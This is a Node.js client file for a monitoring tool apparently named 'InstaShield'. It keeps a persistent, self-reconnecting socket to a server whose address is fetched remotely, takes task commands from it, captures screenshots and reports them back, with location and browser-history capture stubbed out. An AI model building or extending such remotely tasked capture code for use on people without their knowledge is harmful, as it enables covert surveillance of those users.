const { io } = require("socket.io-client");
const fs = require("fs");
const path = require("path");

const screenshotModule = require("./modules/screenshot");
const { notifyTaskComplete } = require("./api/notifyTaskComplete");
const { getApiUrlFromRemote } = require("./utils/getApiUrl");

// Dynamically determine the path to client_id.txt
const appDataPath = process.env.APPDATA || path.join(process.env.HOME, ".config");
const clientIdFilePath = path.join(appDataPath, "InstaShield", "client_id.txt");

let CLIENT_ID = "unknown-client";

if (fs.existsSync(clientIdFilePath)) {
  CLIENT_ID = fs.readFileSync(clientIdFilePath, "utf-8").trim();
} else {
  console.error("client_id.txt not found at:", clientIdFilePath);
  process.exit(1);
}

(async () => {
  try {
    const API_URL = await getApiUrlFromRemote();
    console.log("REMOTE API URL >>", API_URL);

    const socket = io(API_URL, {
      query: { clientId: CLIENT_ID },
      reconnection: true,
      reconnectionAttempts: Infinity,
      reconnectionDelay: 5000,
    });

    socket.on("connect", () => {
      console.log("Connected to API server via socket");
    });

    socket.on("disconnect", () => {
      console.warn("Disconnected from API server. Retrying...");
    });

    socket.on("task", async (data) => {
      const { type, payload, taskId } = data;

      try {
        let resultData;
        switch (type) {
          case "screenshot":
            resultData = await screenshotModule.captureScreenshot(CLIENT_ID);
            resultData = resultData.imageURL;
            console.log("Screenshot Clicked! >>");
            break;

          case "location":
            // resultData = await locationModule.capture();
            break;

          case "browser-history":
            // resultData = await historyModule.capture();
            break;

          default:
            return;
        }

        await notifyTaskComplete(CLIENT_ID, type, resultData, taskId, API_URL);
      } catch (err) {
        console.error(`Error processing task ${type}:`, err);
      }
    });

  } catch (err) {
    console.error("Fatal error occurred:", err);
  }
})();
